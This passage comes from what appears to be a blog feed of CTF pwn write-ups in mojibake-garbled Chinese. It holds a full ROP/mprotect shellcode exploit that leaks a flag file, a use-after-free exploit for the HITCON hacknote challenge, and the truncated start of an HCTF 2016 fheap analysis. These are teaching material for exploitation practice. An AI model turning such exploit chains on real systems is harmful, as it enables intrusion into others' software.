class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure><p>æ‰“å¼€å½“å‰æ–‡ä»¶å¤¹ï¼Œç„¶åè¯»å–åˆ°æŒ‡å®šå†…å­˜åé€šè¿‡writeè¾“å‡ºï¼Œè¿™é‡Œçš„ç¬¬ä¸€ä¸ªpayloadæ•°æ®çš„å†™å…¥åŒºæœ€åé€‰æ‹©bssæ®µä¸­é—´ä½ç½®å¦‚mp_start+0x200ï¼Œå¼€å¤´éƒ¨åˆ†å¯èƒ½ä¸è¡Œï¼Œå®˜æ–¹wp</p><p>mov rdi, 0; mov rsi, 0x%x;mov rdx, 0x100;mov rax, 0; syscall; push rsi; ret;æ¥è¿”å›ï¼Œæˆ‘æ„Ÿè§‰mov rsi, 0x%x;push rsi; ret;å°±å¯ä»¥ï¼Œä¹Ÿæ‰“é€šäº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè¦å¤šä¸€å±‚syscall</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br></pre></td></tr></table></figure><p>æ³„éœ²å‡ºæ–‡ä»¶åï¼Œæ­£å¸¸è¯»å–å°±å¯ä»¥ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰å…³é—­å‰ä¸€ä¸ªæ‰“å¼€çš„fdæŒ‡é’ˆï¼Œæ‰€ä»¥è¿™é‡Œæ–‡ä»¶æŒ‡é’ˆå˜ä¸º4</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230307000430195.png" alt="image-20230307000430195"></p><h2 id="EXP-è¿™é‡Œå…¶å®å¯ä»¥å°è£…ä¸ªå‡½æ•°ï¼Œæ‡’å¾—æäº†"><a href="#EXP-è¿™é‡Œå…¶å®å¯ä»¥å°è£…ä¸ªå‡½æ•°ï¼Œæ‡’å¾—æäº†" class="headerlink" title="EXP è¿™é‡Œå…¶å®å¯ä»¥å°è£…ä¸ªå‡½æ•°ï¼Œæ‡’å¾—æäº†"></a>EXP è¿™é‡Œå…¶å®å¯ä»¥å°è£…ä¸ªå‡½æ•°ï¼Œæ‡’å¾—æäº†</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./grxer???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line">db(<span class="string">&#x27;b *0x40120E&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x0000000000401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0000000000401281</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_ad=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bin_sh=base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">poprdi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdi;ret;&#x27;</span>)))+base</span><br><span class="line">poprsi=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))+base</span><br><span class="line">poprdx_r12=<span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rdx;pop r12;ret;&#x27;</span>)))+base</span><br><span class="line">p(<span class="string">&#x27;poprdi&#x27;</span>,poprdi)</span><br><span class="line">p(<span class="string">&#x27;poprsi&#x27;</span>,poprsi)</span><br><span class="line">p(<span class="string">&#x27;poprdx&#x27;</span>,poprdx_r12)</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+base</span><br><span class="line">read_ad=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+base</span><br><span class="line">mp_start=<span class="number">0x404000</span></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x100</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(mp_start)+p64(poprsi)+p64(<span class="number">4096</span>)+p64(poprdx_r12)+p64(<span class="number">0x7</span>)+p64(<span class="number">0x6666</span>)+p64(mprotect)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>+<span class="number">0x200</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./&#x27;</span>))</span><br><span class="line">payload+=asm(shellcraft.getdents64(<span class="number">3</span>, mp_start+<span class="number">0x100</span>, <span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rsi, 0x%x;push rsi; ret;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> %(main))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line">flag=r(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag---&gt;&#x27;</span>+flag.decode())</span><br><span class="line">flagname=<span class="string">&#x27;./flag&#x27;</span>+flag.decode()</span><br><span class="line"><span class="built_in">print</span>(flagname)</span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x60</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line"><span class="comment"># sa(b&#x27;\x96\x88\n\n&#x27;,payload)</span></span><br><span class="line">s(payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x60</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(poprsi)+p64(mp_start+<span class="number">0x200</span>)+p64(poprdx_r12)+p64(<span class="number">0x200</span>)+p64(<span class="number">0x66666</span>)+p64(read_ad)+p64(mp_start+<span class="number">0x200</span>)</span><br><span class="line">sa(<span class="string">b&#x27;\x96\x88\n&#x27;</span>,payload)</span><br><span class="line">payload=asm(shellcraft.<span class="built_in">open</span>(flagname))</span><br><span class="line">payload+=asm(shellcraft.read(<span class="number">4</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">payload+=asm(shellcraft.write(<span class="number">1</span>,mp_start+<span class="number">0x100</span>,<span class="number">0x200</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Stack Migration </tag>
            
            <tag> Sandbox </tag>
            
            <tag> Getdents64 Leak </tag>
            
            <tag> Mprotect </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Using-After-Free</title>
      <link href="/2023/03/04/Using-After-Free/"/>
      <url>/2023/03/04/Using-After-Free/</url>
      
        <content type="html"><![CDATA[<h1 id="Using-After-Free"><a href="#Using-After-Free" class="headerlink" title="Using-After-Free"></a>Using-After-Free</h1><p>æ€»ä¹‹å°±æ˜¯freeåæ²¡æœ‰å°†æŒ‡é’ˆç½®ä¸ºnullé€ æˆçš„ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointerã€‚</p><span id="more"></span><h2 id="HITCON-training-lib10"><a href="#HITCON-training-lib10" class="headerlink" title="HITCON-training lib10"></a>HITCON-training lib10</h2><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p><img src="/2023/03/04/Using-After-Free/image-20230304180356251.png" alt="image-20230304180356251"></p><p>é¢˜ç›®å¯ä»¥æœ€å¤šåˆ›å»º5ä¸ªnote,ä¼šæ”¾åœ¨å…¨å±€å˜é‡notelisté‡Œ(00x804A070)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> (*put)(<span class="type">void</span>*);</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>åæ²¡æœ‰å°†æŒ‡é’ˆç½®ä¸º<span class="number">0</span></span><br></pre></td></tr></table></figure><p>print_noteé‡Œæœ‰</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  notelist[v1]-&gt;put(notelist[v1]);</span><br></pre></td></tr></table></figure><p>æœ‰åé—¨å‡½æ•°magic</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶notelist[v1]-&gt;putä¸ºmagicå°±å¯ä»¥æ‹¿åˆ°flag</p><p>åœ¨ add_noteé‡Œæˆ‘ä»¬ä¼šå…ˆmalloc noteç»“æ„ä½“ï¼Œåé¢ä¼šå†ç”³è¯·contextçš„å†…å­˜ï¼Œdelæ—¶ä¼šå…ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(notelist[v1]-&gt;content);</span><br><span class="line"><span class="built_in">free</span>(notelist[v1]);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆ</p><p>addnote(16, bâ€aaaaâ€) # add note 0<br>addnote(16, bâ€ddaaâ€) # add note 1</p><p>ç¬¬ä¸€æ¬¡malloc</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184036356.png" alt="image-20230304184036356"></p><p>ç¬¬äºŒæ¬¡</p><p><img src="/2023/03/04/Using-After-Free/image-20230304184226530.png" alt="image-20230304184226530"></p><p>ä¾æ¬¡mallocï¼Œå †çš„æ˜¯è¿™æ ·çš„</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185117164.png" alt="image-20230304185117164"></p><p>æˆ‘ä»¬å»free</p><p><img src="/2023/03/04/Using-After-Free/image-20230304185427692.png" alt="image-20230304185427692"></p><h3 id="tchche-bin"><a href="#tchche-bin" class="headerlink" title="tchche bin"></a>tchche bin</h3><p><strong>Tcache</strong>æœºåˆ¶æ˜¯åœ¨<strong>libc-2.26</strong>ä¸­å¼•å…¥ï¼Œå°äº0x400çš„å †ï¼Œ<strong>FILO</strong>(å…ˆè¿›åå‡º)çš„å•å¾ªç¯é“¾è¡¨ã€ç²¾ç¡®åˆ†é…(ä¸åˆ‡å‰²)ã€<strong>free</strong>åä¸ºé˜²æ­¢åˆå¹¶åä¸€ä¸ªå †å—çš„<strong>inuse</strong>ä½ä¸ç½®<strong>0</strong>ï¼Œå¤§å°ä½äº<strong>0x400</strong>å­—èŠ‚çš„å †å—æ—¶ä¼šé¦–å…ˆæ”¾å…¥<strong>Tcachebin</strong>ï¼Œæ¯ä¸ªbinsæœ€å¤šå­˜æ”¾7ä¸ªchunkï¼Œmallocåœ¨ç”³è¯·å¤§å°ä½äº<strong>0x400</strong>çš„å †å—æ—¶</p><p>å†æ¬¡ç”³è¯·</p><p>addnote(8, p32(magic))</p><p>è¿™é‡Œéƒ½éœ€è¦0x10å¤§å°çš„chunkï¼Œåˆšå¥½æœ‰ä¸¤ä¸ª</p><p>è¿™æ ·æˆ‘ä»¬ä¿®æ”¹note3çš„contextå†…å®¹ä¹Ÿå°±ä¿®æ”¹äº†note1çš„putæŒ‡é’ˆ</p><p><img src="/2023/03/04/Using-After-Free/image-20230304190759691.png" alt="image-20230304190759691"></p><p><img src="/2023/03/04/Using-After-Free/image-20230304192052112.png" alt="image-20230304192052112"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">16</span>, <span class="string">b&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="2016-HCTF-fheap"><a href="#2016-HCTF-fheap" class="headerlink" title="2016 HCTF fheap"></a>2016 HCTF fheap</h2><p><a href="https://github.com/zh-explorer/hctf2016-fheap">https://github.com/zh-explorer/hctf2016-fheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/c/p/heap&gt; ./pwn-f </span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">So, let&#x27;s crash the world</span><br><span class="line">+++++++++++++++++++++++++++</span><br><span class="line">1.create string</span><br><span class="line">2.delete string</span><br><span class="line">3.quit</span><br><span class="line">^Câ                                                                                                                                             grxer@grxer ~/D/c/p/heap [SIGINT]&gt; checksec pwn-f </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/ctfwiki/pwn/heap/pwn-f&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>åŠŸèƒ½å¾ˆç®€å•ï¼Œå†createæ—¶ä¼šmallocä¸€ä¸ªç»“æ„ä½“ï¼Œstringé•¿åº¦&gt;0xfä¼šå†æ¬¡ç”³è¯·ä¸€å—å†…å­˜,&lt;ç›´æ¥å­˜åœ¨äº†ç»“æ„ä½“é‡Œï¼Œç›´æ¥æ¨æµ‹å‡ºç»“æ„ä½“å¤§è‡´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">String</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">char</span> *buf;</span><br><span class="line">        <span class="type">char</span> <span class="built_in">array</span>[<span class="number">16</span>];</span><br><span class="line">    &#125; o;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="comment">//è¿™é‡Œä¼šå¡«å……8å­—èŠ‚ä»¥æ»¡è¶³ç»“æ„ä½“å¯¹é½è§„åˆ™ </span></span><br><span class="line">    <span class="type">void</span> (*<span class="built_in">free</span>)(<span class="keyword">struct</span> String *ptr);</span><br><span class="line">&#125; String;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨ä¸€ä¸ªç»“æ„ä½“æ•°ç»„çš„å…¨å±€å˜é‡åœ¨0x2020C0æ¥å­˜å‚¨chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> inuse;</span><br><span class="line">    String *str;</span><br><span class="line">&#125; Strings[<span class="number">0x10</span>]; å¤§å°ä¸º<span class="number">16</span>å­—èŠ‚</span><br></pre></td></tr></table></figure><p>åˆ é™¤æ—¶åªæ˜¯ç®€å•freeæ²¡æœ‰null äº§ç”Ÿdangling pointer</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0x11</span> )</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( *((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Are you sure?:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buf, <span class="string">&quot;yes&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(_QWORD))(*((_QWORD *)&amp;struct_at + <span class="number">2</span> * (<span class="type">int</span>)v1 + <span class="number">1</span>) + <span class="number">24LL</span>))(*((_QWORD *)&amp;struct_at</span><br><span class="line">                                                                                        + <span class="number">2</span> * (<span class="type">int</span>)v1</span><br><span class="line">                                                                                        + <span class="number">1</span>));</span><br><span class="line">    *((_DWORD *)&amp;struct_at + <span class="number">4</span> * (<span class="type">int</span>)v1) = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>create(10,â€™helloâ€™)<br>create(0x20,â€™grxer666666666666666666666666666â€™)</p><img src="/2023/03/04/Using-After-Free/image-20230307152831940.png" alt="image-20230307152831940" style="zoom:67%;"><h3 id="using-after-free"><a href="#using-after-free" class="headerlink" title="using after free"></a>using after free</h3><p>æˆ‘ä»¬å…ˆcreat ä¸¤ä¸ªstring ï¼Œè¿™æ ·å…±ç”³è¯·äº†2ä¸ª0x32å¤§å°çš„chunkï¼Œå†å…ˆé‡Šæ”¾1å†é‡Šæ”¾0ä¼šè¿›å…¥tcache bins</p><p><code>tchche bin    string0------&gt;string1</code></p><p>è¿™æ—¶å€™æˆ‘ä»¬åœ¨ç”³è¯·ä¸€å—å°äº0x28å¤§å°çš„chunk(ç©ºé—´å¤ç”¨ä¼šå¯¼è‡´æ¯”åŸæ¥å¯ä»¥å¤š8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯chunk headçš„prev size)</p><p>è¿™æ ·æˆ‘ä»¬çš„ç»“æ„ä½“ä¼šåˆ†åˆ°string0åœ°å€ï¼Œcontextä¼šåˆ†åˆ°string 1åœ°å€ï¼Œstring1åœ°å€é‡Œçš„freeå‡½æ•°è¿˜åœ¨é‡Œé¢ï¼Œè€Œä¸”è¿˜åœ¨å…¨å±€ç»“æ„æ•°ç»„é‡Œï¼Œå¯ä»¥æ§åˆ¶è¯¥æŒ‡é’ˆä¸ºä»»æ„å‡½æ•°</p><p>è¿™æ ·æˆ‘ä»¬ä¸‹æ¬¡å†delete(0)å¯ä»¥æŠŠä¸¤ä¸ªchunkå†æ¬¡é‡Šæ”¾</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D6C</span><span class="params">(<span class="type">void</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*a1);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¬¡ç”³è¯·å°±åˆå¯ä»¥å’Œä¹‹å‰ä¸€æ ·ï¼Œå†æ¬¡deleteï¼ˆ1ï¼‰å¾ªç¯åˆ©ç”¨</p><p><img src="/2023/03/04/Using-After-Free/image-20230307163539833.png" alt="image-20230307163539833"></p><h4 id="è¦†ç›–ä¸ºcall-putsï¼Œæ³„éœ²pieåŸºå€"><a href="#è¦†ç›–ä¸ºcall-putsï¼Œæ³„éœ²pieåŸºå€" class="headerlink" title="è¦†ç›–ä¸ºcall putsï¼Œæ³„éœ²pieåŸºå€"></a>è¦†ç›–ä¸ºcall putsï¼Œæ³„éœ²pieåŸºå€</h4><p>payload&#x3D;bâ€™aâ€™*24+bâ€™\x1aâ€™<br>create(len(payload),payload)</p><h4 id="è¦†ç›–ä¸ºprintfï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#è¦†ç›–ä¸ºprintfï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="è¦†ç›–ä¸ºprintfï¼Œåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>è¦†ç›–ä¸ºprintfï¼Œåˆ©ç”¨æ 